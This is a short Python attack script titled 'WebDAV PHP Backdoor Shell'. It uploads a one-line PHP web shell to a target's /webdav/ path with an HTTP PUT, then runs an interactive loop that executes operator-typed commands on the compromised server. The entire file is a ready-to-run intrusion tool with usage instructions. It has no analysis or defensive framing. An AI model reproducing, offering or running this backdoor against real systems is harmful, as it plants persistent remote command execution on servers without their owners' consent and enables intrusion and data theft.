#!/usr/bin/python3
# By. Jessi
# WebDAV PHP Backdoor Shell
# Usage: python3 webdav-backdoor.py target

import requests
import sys

print('Uploading Backdoor...')
target = sys.argv[1]
url = 'http://' + target+'/webdav/cmd.php'
payload = """<?php echo shell_exec($_GET['cmd']); ?>"""

upload = requests.put(url, data=payload)
print('Backdoor Uploaded!')
print('Starting Shell...')

def backdoor_shell():
    command = input('cmd-shell> ')
    backdoor = 'http://' + target+'/webdav/cmd.php?cmd=' + command+''
    shell = requests.get(backdoor)
    print(shell.text)
    backdoor_shell()

backdoor_shell()
